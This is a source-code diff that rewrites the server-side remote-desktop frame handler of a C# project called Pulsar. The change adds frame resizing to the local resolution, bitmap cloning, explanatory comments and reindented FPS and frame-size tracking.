@@ -1,4 +1,4 @@
-﻿using Pulsar.Common.Enums;
+using Pulsar.Common.Enums;
 using Pulsar.Common.Messages;
 using Pulsar.Common.Messages.Monitoring.RemoteDesktop;
 using Pulsar.Common.Messages.Other;
@@ -316,93 +316,119 @@ namespace Pulsar.Server.Messages
                     MonitorIndex = displayIndex
                 });
             }
-        }        private async void Execute(ISender client, GetDesktopResponse message)
+        } 
+    private async void Execute(ISender client, GetDesktopResponse message)
+    {
+    _framesReceived++;
+
+    // Capture FPS reported by client
+    if (message.FrameRate > 0 && message.FrameRate != _lastReportedFps)
+    {
+        _lastReportedFps = message.FrameRate;
+        Debug.WriteLine($"Client-reported FPS updated: {_lastReportedFps}");
+    }
+
+    // Update estimated FPS every second
+    if (_performanceMonitor.ElapsedMilliseconds >= 1000)
+    {
+        _estimatedFps = _framesReceived / (_performanceMonitor.ElapsedMilliseconds / 1000.0);
+        Debug.WriteLine($"Estimated FPS: {_estimatedFps:F1}, Client-reported FPS: {(_lastReportedFps > 0 ? _lastReportedFps.ToString("F1") : "N/A")}, Frames received: {_framesReceived}");
+        _framesReceived = 0;
+        _performanceMonitor.Restart();
+    }
+
+    lock (_syncLock)
+    {
+        if (!IsStarted)
+            return;
+
+        // Initialize or reconfigure codec if stream parameters changed
+        if (_codec == null
+            || _codec.ImageQuality != message.Quality
+            || _codec.Monitor != message.Monitor
+            || _codec.Resolution != message.Resolution
+            || _codec.CompressionFormat != message.ImageFormat)
         {
-            _framesReceived++;
+            _codec?.Dispose();
+            _codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution, message.ImageFormat);
+        }
 
-            // Capture the FPS reported by the client
-            if (message.FrameRate > 0 && message.FrameRate != _lastReportedFps)
+        // Track compressed frame size stats
+        if (message.Image != null)
+        {
+            long size = message.Image.LongLength;
+            Interlocked.Exchange(ref _lastFrameBytes, size);
+            Interlocked.Add(ref _accumulatedFrameBytes, size);
+            Interlocked.Increment(ref _frameBytesSamples);
+        }
+
+        using (var ms = new MemoryStream(message.Image))
+        {
+            try
             {
-                _lastReportedFps = message.FrameRate;
-                Debug.WriteLine($"Client-reported FPS updated: {_lastReportedFps}");
-            }
-
-            if (_performanceMonitor.ElapsedMilliseconds >= 1000)
-            {
-                _estimatedFps = _framesReceived / (_performanceMonitor.ElapsedMilliseconds / 1000.0);
-                Debug.WriteLine($"Estimated FPS: {_estimatedFps:F1}, Client-reported FPS: {(_lastReportedFps > 0 ? _lastReportedFps.ToString("F1") : "N/A")}, Frames received: {_framesReceived}");
-                _framesReceived = 0;
-                _performanceMonitor.Restart();
-            }
-
-            lock (_syncLock)
-            {
-                if (!IsStarted)
-                    return;
-
-                if (_codec == null
-                    || _codec.ImageQuality != message.Quality
-                    || _codec.Monitor != message.Monitor
-                    || _codec.Resolution != message.Resolution
-                    || _codec.CompressionFormat != message.ImageFormat)
+                using (var decoded = _codec.DecodeData(ms))
                 {
-                    _codec?.Dispose();
-                    _codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution, message.ImageFormat);
-                }
-
-                if (message.Image != null)
-                {
-                    long size = message.Image.LongLength;
-                    Interlocked.Exchange(ref _lastFrameBytes, size);
-                    Interlocked.Add(ref _accumulatedFrameBytes, size);
-                    Interlocked.Increment(ref _frameBytesSamples);
-                }
-
-                using (var ms = new MemoryStream(message.Image))
-                {
-                    try
+                    if (decoded != null)
                     {
-                        var decoded = _codec.DecodeData(ms);
-                        if (decoded != null)
+                        // Restore old logic — ensure local resolution is valid
+                        EnsureLocalResolutionInitialized(decoded.Size);
+
+                        // Old-method compatible rendering path:
+                        // If resolution differs, resize to local display size
+                        if ((decoded.Width != LocalResolution.Width ||
+                             decoded.Height != LocalResolution.Height) &&
+                            LocalResolution.Width > 0 && LocalResolution.Height > 0)
                         {
-                            EnsureLocalResolutionInitialized(decoded.Size);
+                            using (var resized = new Bitmap(decoded, LocalResolution))
+                            {
+                                // Clone the resized bitmap before disposing
+                                OnReport((Bitmap)resized.Clone());
+                            }
+                        }
+                        else
+                        {
                             OnReport(decoded);
                         }
                     }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Error decoding frame: {ex.Message}");
-                    }
                 }
-
-                message.Image = null;
-
-                long serverTimestamp = Stopwatch.GetTimestamp();
-                _frameTimestamps.Enqueue(serverTimestamp);
-                
-                if (_framesReceived % _fpsCalculationWindow == 0)
-                {
-                    double elapsedSeconds = _performanceMonitor.Elapsed.TotalSeconds;
-                    _estimatedFps = _framesReceived / elapsedSeconds;
-                    
-                    if (_framesReceived >= 100)
-                    {
-                        _framesReceived = 0;
-                        _performanceMonitor.Restart();
-                    }
-                }
-                
-                while (_frameTimestamps.Count > _fpsCalculationWindow && _frameTimestamps.TryDequeue(out _)) { }
-
-                Interlocked.Decrement(ref _pendingFrames);
             }
-
-            if (IsBufferedMode && (message.IsLastRequestedFrame || _pendingFrames <= 8))
+            catch (Exception ex)
             {
-                await RequestMoreFramesAsync();
+                Debug.WriteLine($"Error decoding frame: {ex.Message}");
             }
         }
 
+        // Release raw image bytes to free memory
+        message.Image = null;
+
+        // Timestamp for FPS tracking
+        long serverTimestamp = Stopwatch.GetTimestamp();
+        _frameTimestamps.Enqueue(serverTimestamp);
+
+        if (_framesReceived % _fpsCalculationWindow == 0)
+        {
+            double elapsedSeconds = _performanceMonitor.Elapsed.TotalSeconds;
+            _estimatedFps = _framesReceived / elapsedSeconds;
+
+            if (_framesReceived >= 100)
+            {
+                _framesReceived = 0;
+                _performanceMonitor.Restart();
+            }
+        }
+
+        // Keep only recent timestamps
+        while (_frameTimestamps.Count > _fpsCalculationWindow && _frameTimestamps.TryDequeue(out _)) { }
+
+        Interlocked.Decrement(ref _pendingFrames);
+    }
+
+    // Request new batch of frames when buffer low
+    if (IsBufferedMode && (message.IsLastRequestedFrame || _pendingFrames <= 8))
+    {
+        await RequestMoreFramesAsync();
+       }
+    }
         private void EnsureLocalResolutionInitialized(Size fallbackSize)
         {
             if (fallbackSize.Width <= 0 || fallbackSize.Height <= 0)
